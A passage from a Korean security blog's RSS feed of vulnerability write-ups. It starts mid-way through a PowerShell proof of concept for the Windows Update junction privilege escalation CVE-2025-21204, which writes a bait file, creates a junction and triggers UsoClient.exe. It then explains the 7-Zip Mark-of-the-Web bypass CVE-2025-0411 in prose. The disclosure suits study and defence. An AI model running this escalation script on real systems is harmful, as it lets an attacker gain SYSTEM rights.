ready.`n&quot;</span><span class="hljs-comment"># Payload content</span><span class="hljs-variable">$payload</span> = <span class="hljs-string">@&quot;</span><span class="hljs-string">Payload executed by SYSTEM at: <span class="hljs-variable">$</span>(Get-Date)</span><span class="hljs-string">&quot;@</span><span class="hljs-comment"># Write bait payload</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Writing payload to: <span class="hljs-variable">$payloadPath</span>&quot;</span><span class="hljs-variable">$payload</span> | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-FilePath</span> <span class="hljs-variable">$payloadPath</span> <span class="hljs-literal">-Encoding</span> ASCII<span class="hljs-variable">$payload</span> | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-FilePath</span> <span class="hljs-variable">$proofPath</span> <span class="hljs-literal">-Append</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] Payload written.`n&quot;</span><span class="hljs-comment"># Simulation metadata log</span><span class="hljs-variable">$log</span> = <span class="hljs-string">@&quot;</span><span class="hljs-string">CVE-2025-21204 Exploit Simulation</span><span class="hljs-string">-------------------------------------</span><span class="hljs-string">Date         : <span class="hljs-variable">$</span>(Get-Date)</span><span class="hljs-string">Payload File : <span class="hljs-variable">$payloadPath</span></span><span class="hljs-string">Hijack Path  : <span class="hljs-variable">$updateStackRealPath</span></span><span class="hljs-string">Proof File   : <span class="hljs-variable">$proofPath</span></span><span class="hljs-string">&quot;@</span><span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$logPath</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$log</span> <span class="hljs-literal">-Encoding</span> UTF8 <span class="hljs-literal">-Force</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] Simulation metadata saved.`n&quot;</span><span class="hljs-comment"># Attempt junction creation (non-admin safe)</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Attempting junction (no admin)...&quot;</span><span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$updateStackRealPath</span>)) {    <span class="hljs-keyword">try</span> {        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;cmd.exe /c mklink /J `&quot;<span class="hljs-variable">$updateStackRealPath</span>`&quot; `&quot;<span class="hljs-variable">$trapPath</span>`&quot;&quot;</span>        <span class="hljs-built_in">Start-Process</span> <span class="hljs-literal">-FilePath</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;/c mklink /J `&quot;<span class="hljs-variable">$updateStackRealPath</span>`&quot; `&quot;<span class="hljs-variable">$trapPath</span>`&quot;&quot;</span> <span class="hljs-literal">-NoNewWindow</span> <span class="hljs-literal">-Wait</span>        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] Junction created: <span class="hljs-variable">$updateStackRealPath</span> &#x2192; <span class="hljs-variable">$trapPath</span>&quot;</span>    } <span class="hljs-keyword">catch</span> {        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[-] Failed to create junction: <span class="hljs-variable">$_</span>&quot;</span>    }} <span class="hljs-keyword">else</span> {    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[!] Target path already exists: <span class="hljs-variable">$updateStackRealPath</span>&quot;</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[-] Cannot create junction unless folder is removed by SYSTEM update cleanup.&quot;</span>}<span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-comment"># Trigger update</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Triggering UsoClient.exe (StartScan)...&quot;</span><span class="hljs-keyword">try</span> {    <span class="hljs-built_in">Start-Process</span> UsoClient.exe <span class="hljs-literal">-ArgumentList</span> StartScan <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] UsoClient.exe started.`n&quot;</span>} <span class="hljs-keyword">catch</span> {    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[-] Failed to trigger UsoClient.exe: <span class="hljs-variable">$_</span>&quot;</span>}<span class="hljs-comment"># Monitor for SYSTEM process</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Monitoring for SYSTEM process MoUsoCoreWorker.exe...&quot;</span><span class="hljs-variable">$found</span> = <span class="hljs-variable">$false</span><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> <span class="hljs-number">6</span>; <span class="hljs-variable">$i</span>++) {    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Seconds</span> <span class="hljs-number">5</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[=] Attempt <span class="hljs-variable">$</span>{i}: Checking...&quot;</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;MoUsoCoreWorker&quot;</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue) {        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[!] SYSTEM process detected: MoUsoCoreWorker.exe&quot;</span>        <span class="hljs-variable">$found</span> = <span class="hljs-variable">$true</span>        <span class="hljs-keyword">break</span>    }}<span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Seconds</span> <span class="hljs-number">5</span><span class="hljs-comment"># Check for success</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n[*] Analyzing payload execution...&quot;</span><span class="hljs-keyword">if</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$proofPath</span>) {    <span class="hljs-variable">$owner</span> = (<span class="hljs-built_in">Get-Acl</span> <span class="hljs-variable">$proofPath</span>).Owner    <span class="hljs-variable">$timestamp</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$proofPath</span>).LastWriteTime    <span class="hljs-variable">$details</span> = <span class="hljs-string">@&quot;</span><span class="hljs-string">[+] Exploit successful</span><span class="hljs-string">Payload executed as: <span class="hljs-variable">$owner</span></span><span class="hljs-string">Last Modified: <span class="hljs-variable">$timestamp</span></span><span class="hljs-string">&quot;@</span>    <span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$verdictPath</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$true</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[&#x2713;] SUCCESS: SYSTEM likely accessed the payload.&quot;</span>} <span class="hljs-keyword">else</span> {    <span class="hljs-variable">$details</span> = <span class="hljs-string">@&quot;</span><span class="hljs-string">[!] Exploit failed</span><span class="hljs-string">No proof file found.</span><span class="hljs-string">Time: <span class="hljs-variable">$</span>(Get-Date)</span><span class="hljs-string">&quot;@</span>    <span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$verdictPath</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$false</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[&#x2717;] FAILURE: Payload was not executed by SYSTEM.&quot;</span>}<span class="hljs-comment"># Save evidence</span><span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$evidencePath</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$details</span> <span class="hljs-literal">-Encoding</span> UTF8<span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Forensic evidence saved: <span class="hljs-variable">$evidencePath</span>&quot;</span><span class="hljs-comment"># End</span><span class="hljs-built_in">Stop-Transcript</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n[&#x2713;] Simulation complete. See verbose log: <span class="hljs-variable">$verboseLog</span>`n&quot;</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB41C; 2025&#xB144; 4&#xC6D4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xACF5;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xC644;&#xD654; &#xC870;&#xCE58;&#xB85C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB294; <code>C:\inetpub</code> &#xB4F1;&#xC758; &#xD3F4;&#xB354;&#xB97C; &#xBBF8;&#xB9AC; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAE30;&#xBCF8; ACL&#xC744; &#xC801;&#xC6A9;&#xD574;&#xC11C; link following &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Link-Following/">Link Following</category>
      
      <category domain="https://hackyboiz.github.io/tags/Symbolic-Link/">Symbolic Link</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/17/pwndorei/2025-04-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-0411 : 7-Zip의 Mark-of-the-Web (MotW) 우회로 인한 악성코드 감염</title>
      <link>https://hackyboiz.github.io/2025/04/16/OUYA77/2025-04-16/</link>
      <guid>https://hackyboiz.github.io/2025/04/16/OUYA77/2025-04-16/</guid>
      <pubDate>Wed, 16 Apr 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trendmicro.com/ko_kr/research/25/a/cve-2025-0</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/ko_kr/research/25/a/cve-2025-0411-ukrainian-organizations-targeted.html">https://www.trendmicro.com/ko_kr/research/25/a/cve-2025-0411-ukrainian-organizations-targeted.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>7-Zip &lt; 24.09</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2024&#xB144; 9&#xC6D4;, Trend ZDI &#xC704;&#xD611; &#xD5CC;&#xD305;&#xD300;&#xC740; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB294; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2025-0411&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; 7-Zip &#xC555;&#xCD95; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xC6B0;&#xD06C;&#xB77C;&#xC774;&#xB098; &#xAE30;&#xAD00;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD558;&#xB294; SmokeLoader &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xCEA0;&#xD398;&#xC778;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB7EC;&#xC2DC;&#xC544; &#xC0AC;&#xC774;&#xBC84; &#xBC94;&#xC8C4; &#xADF8;&#xB8F9;&#xC774; &#xB7EC;&#xC2DC;&#xC544;-&#xC6B0;&#xD06C;&#xB77C;&#xC774;&#xB098; &#xBD84;&#xC7C1; &#xC911;&#xC5D0; &#xC0AC;&#xC774;&#xBC84; &#xC2A4;&#xD30C;&#xC774; &#xD65C;&#xB3D9;&#xC744; &#xC704;&#xD574; &#xC774; &#xC804;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC73C;&#xBA70;, &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC190;&#xC0C1;&#xB41C; &#xC774;&#xBA54;&#xC77C; &#xACC4;&#xC815;&#xACFC; homoglyph &#xACF5;&#xACA9;&#xC744; &#xD65C;&#xC6A9;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><p>Windows &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC778;&#xD130;&#xB137;&#xCC98;&#xB7FC; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xACF3;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xB54C;, &#xD30C;&#xC77C;&#xC5D0; <strong>Mark-of-the-Web (MotW)</strong>&#xC774;&#xB77C;&#xB294; &#xC77C;&#xC885;&#xC758; <strong>&#xCD9C;&#xCC98; &#xD45C;&#xC2DC;</strong>&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.  &#xC774; &#xD45C;&#xC2DC;&#xB294; Windows&#xC640; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xC704;&#xD5D8;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xC5B4;, &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xD30C;&#xC77C;&#xC744; &#xC880; &#xB354; &#xC8FC;&#xC758;&#xD574;&#xC11C; &#xB2E4;&#xB8E8;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.  &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, MotW&#xAC00; &#xD45C;&#xC2DC;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD558;&#xBA74; Windows Defender SmartScreen&#xC774; &#xD30C;&#xC77C;&#xC758; reputation&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xACBD;&#xACE0;&#xB97C; &#xBCF4;&#xB0B4; &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xAC10;&#xC5FC;&#xC744; &#xB9C9;&#xB294; &#xB370; &#xB3C4;&#xC6C0;&#xC744; &#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xC740; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC758; <code>Zone.Identifier</code> &#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xC815;&#xBCF4;&#xB294; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xC778;&#xD130;&#xB137;&#xC5D0;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC744; Windows&#xC5D0; &#xC54C;&#xB9BD;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/16/OUYA77/2025-04-16/image.png" alt="image.png"></p><p>&#xB610;&#xD55C; &#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xC740; MotW &#xD0DC;&#xADF8;&#xB85C; &#xC778;&#xD574; &#xB098;&#xD0C0;&#xB098;&#xB294; Windows Defender SmartScreen &#xBCF4;&#xC548; &#xACBD;&#xACE0;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xACE0;&#xB294; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xC704;&#xD5D8;&#xD560; &#xC218; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB85C;&#xBD80;&#xD130; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/16/OUYA77/2025-04-16/image%201.png" alt="image.png"></p><p>&#xCC38;&#xACE0;&#xB85C; &#xD30C;&#xC77C;&#xC758; &#xC18D;&#xC131;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774;(&#xD30C;&#xB780;&#xBC15;&#xC2A4;) MotW &#xD0DC;&#xADF8; &#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xD0DC;&#xADF8;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589; &#xC2DC; &#xC704;&#xC640; &#xAC19;&#xC774; &#xACBD;&#xACE0; &#xD31D;&#xC5C5;&#xC774; &#xB098;&#xD0C0;&#xB0A9;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/16/OUYA77/2025-04-16/image%202.png" alt="image.png"></p><h3 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h3><p>&#xADF8;&#xB7EC;&#xB098; CVE-2025-0411 &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xAC00; 7-Zip&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD30C;&#xC77C;&#xC744; <strong>&#xC774;&#xC911; &#xC555;&#xCD95;</strong>&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC774;&#xB7EC;&#xD55C; MotW &#xBCF4;&#xD638;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>Windows&#xB294; &#xAC89;&#xC5D0; &#xC788;&#xB294; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC5D0;&#xB9CC; MotW &#xD45C;&#xC2DC;&#xB97C; &#xD558;&#xACE0;, &#xADF8; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xC5D0;&#xB294; MotW &#xD45C;&#xC2DC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</strong>  &#xBC14;&#xB85C; &#xC774; &#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC545;&#xC131; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xC548;&#xCABD; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC5D0; &#xC228;&#xAE30;&#xACE0;, &#xAC89;&#xCABD; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xBC30;&#xD3EC;&#xD568;&#xC73C;&#xB85C;&#xC368; Windows&#xC758; MotW &#xBCF4;&#xD638;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774;&#xB807;&#xAC8C; &#xC774;&#xC911;&#xC73C;&#xB85C; &#xC555;&#xCD95;&#xB41C; &#xD30C;&#xC77C;&#xC744; 7-Zip&#xC73C;&#xB85C; &#xC5F4;&#xACE0; &#xC548;&#xCABD; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74;, MotW &#xACBD;&#xACE0;&#xB098; Windows Defender SmartScreen&#xC758; &#xAC80;&#xC0AC; &#xC5C6;&#xC774; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h3><p><img src="/2025/04/16/OUYA77/2025-04-16/image%203.png" alt="image.png"></p><p>&#xC774; &#xADF8;&#xB9BC;&#xC740; ZIP &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC774; &#xB2E4;&#xB978; ZIP &#xC555;&#xCD95; &#xD30C;&#xC77C; &#xC548;&#xC5D0; &#xC911;&#xCCA9;&#xB41C; CVE-2025-0411&#xC758; PoC &#xB370;&#xBAA8;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; PoC&#xC5D0;&#xC11C; &#xC911;&#xCCA9;&#xB41C; &#xC555;&#xCD95; &#xD30C;&#xC77C;(poc.outer.zip\poc.inner.zip) &#xB0B4;&#xBD80;&#xC5D0; &#xC788;&#xB294; <code>poc.bat</code> &#xD30C;&#xC77C;&#xC5D0;&#xB294; MotW &#xBCF4;&#xD638;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBCF4;&#xD638; &#xBD80;&#xC7AC;&#xB85C; &#xC778;&#xD574; &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xAC10;&#xC5FC; &#xC704;&#xD5D8;&#xC774; &#xD06C;&#xAC8C; &#xC99D;&#xAC00;&#xD558;&#xACE0; Windows Defender SmartScreen&#xC774; &#xD30C;&#xC77C;&#xC758; reputation &#xBC0F; &#xC11C;&#xBA85;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xC555;&#xCD95;&#xD574;&#xC81C; &#xD6C4; &#xC2E4;&#xD589;&#xC744; &#xD558;&#xBA74;, &#xACBD;&#xACE0; &#xD31D;&#xC5C5;&#xC774; &#xB728;&#xC9C0; &#xC54A;&#xACE0; &#xBC14;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2E4;&#xD589;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/16/OUYA77/2025-04-16/image%204.png" alt="image.png"></p><p>&#xC774; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC6B0;&#xD06C;&#xB77C;&#xC774;&#xB098; &#xB2E8;&#xCCB4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD55C; SmokeLoader &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xCEA0;&#xD398;&#xC778;&#xC5D0; &#xC545;&#xC6A9;&#xB41C; &#xAC83;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCEA0;&#xD398;&#xC778;&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xC6B0;&#xD06C;&#xB77C;&#xC774;&#xB098; &#xC815;&#xBD80; &#xAE30;&#xAD00;&#xACFC; &#xAE30;&#xC5C5;&#xC744; &#xD45C;&#xC801;&#xC73C;&#xB85C; &#xC0BC;&#xC544; &#xC0AC;&#xC774;&#xBC84; &#xC2A4;&#xD30C;&#xC774; &#xD65C;&#xB3D9;&#xC744; &#xC218;&#xD589;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC740; &#xC190;&#xC0C1;&#xB41C; &#xC774;&#xBA54;&#xC77C; &#xACC4;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xC744; &#xC720;&#xD3EC;&#xD558;&#xACE0;, &#xD2B9;&#xD788; &#x201C;Homoglyph &#xACF5;&#xACA9;&#x201D;&#xC774;&#xB77C;&#xB294; &#xAE30;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD30C;&#xC77C; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xAD50;&#xBB18;&#xD558;&#xAC8C; &#xC704;&#xC7A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><blockquote><p><code>Homoglyph</code> &#xACF5;&#xACA9;&#xC740; &#xC2DC;&#xAC01;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xC0AC;&#xD55C; &#xBB38;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC18D;&#xC774;&#xB294; &#xACF5;&#xACA9; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;.  &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD569;&#xBC95;&#xC801;&#xC778; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB098; &#xD30C;&#xC77C;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xB3C4;&#xB85D; &#xC545;&#xC131; &#xCF58;&#xD150;&#xCE20;&#xB97C; &#xC704;&#xC7A5;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD074;&#xB9AD;&#xC744; &#xC720;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB3C4;&#xBA54;&#xC778; &#xC774;&#xB984;&#xC5D0;&#xC11C; &#xB77C;&#xD2F4; &#xBB38;&#xC790; &#x201C;c&#x201D; &#xB300;&#xC2E0; &#xD0A4;&#xB9B4; &#xBB38;&#xC790; &#x201C;Es&#x201D;(&#x421; &#xB610;&#xB294; &#x441;)&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xB450; &#xBB38;&#xC790;&#xB294; &#xAC89;&#xBCF4;&#xAE30;&#xC5D0;&#xB294; &#xAC70;&#xC758; &#xB3D9;&#xC77C;&#xD558;&#xC9C0;&#xB9CC;, &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xBB38;&#xC790;&#xB85C; &#xC778;&#xC2DD;&#xD569;&#xB2C8;&#xB2E4;.  &#xC774;&#xB97C; &#xD1B5;&#xD574; &#x201C;api-microsoft[.]com&#x201D;&#xACFC; &#xAC19;&#xC774; &#xD569;&#xBC95;&#xC801;&#xC778; Microsoft &#xC0AC;&#xC774;&#xD2B8;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xB294; &#xC545;&#xC131; &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC18D;&#xC544;&#xC11C; &#xAC1C;&#xC778; &#xC815;&#xBCF4;&#xB098; &#xC790;&#xACA9; &#xC99D;&#xBA85;(&#xC544;&#xC774;&#xB514;, &#xBE44;&#xBC00;&#xBC88;&#xD638;)&#xC744; &#xC785;&#xB825;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/dhmosfunk/7-Zip-CVE-2025-0411-POC">https://github.com/dhmosfunk/7-Zip-CVE-2025-0411-POC</a><br><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-045/">https://www.zerodayinitiative.com/advisories/ZDI-25-045/</a><br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0411">https://nvd.nist.gov/vuln/detail/CVE-2025-0411</a><br><a href="https://securityonline.info/cve-2025-0411-7-zip-security-vulnerability-enables-code-execution-update-now/">https://securityonline.info/cve-2025-0411-7-zip-security-vulnerability-enables-code-execution-update-now/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/7-Zip/">7-Zip</category>
      
      <category domain="https://hackyboiz.github.io/tags/SmokeLoader/">SmokeLoader</category>
      
      <category domain="https://hackyboiz.github.io/tags/MotW/">MotW</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-0411/">CVE-2025-0411</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/16/OUYA77/2025-04-16/#disqus_thread</comments>
